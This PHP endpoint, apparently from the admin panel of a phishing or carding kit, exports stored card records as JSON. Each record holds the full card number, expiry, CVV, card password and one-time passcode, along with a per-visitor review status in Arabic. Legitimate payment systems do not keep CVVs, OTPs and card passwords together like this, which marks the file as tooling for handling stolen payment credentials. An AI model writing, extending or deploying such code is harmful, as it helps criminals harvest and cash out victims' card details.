<?php
header('Content-Type: application/json; charset=utf-8');
session_start();
require_once 'config.php';
require_once 'classes/db.php';
require_once 'classes/user.php';

$User = new User();

if (!$User->isLoggedIn()) {
    die(json_encode(['success' => false, 'error' => 'Not logged in']));
}

$cards = $User->fetchAllCards();

if (!$cards) {
    echo json_encode(['success' => true, 'data' => []]);
    exit;
}

// Prepare data for export
$exportData = [];
foreach ($cards as $card) {
    // Determine the correct columns for expiry (support month/year or expire1/expire2)
    $month = $card->month ?? $card->expire1 ?? '--';
    $year = $card->year ?? $card->expire2 ?? '--';
    $expiry = "$month/$year";

    $exportData[] = [
        'id'          => $card->id,
        'visitor_id'  => $card->userId ?? '---',
        'cc_name'     => $card->cardname ?? $card->username ?? '---',
        'cc_number'   => $card->cardNumber ?? '---',
        'cc_exp'      => $expiry,
        'cc_cvv'      => $card->cvv ?? '---',
        'cc_password' => $card->password ?? $card->passwordt ?? '---',
        'cc_otp'      => $card->otp ?? '---',
        'status'      => $card->status == 1 ? 'مقبول' : ($card->status == 2 ? 'مرفوض' : 'قيد الانتظار')
    ];
}

echo json_encode(['success' => true, 'data' => $exportData]);
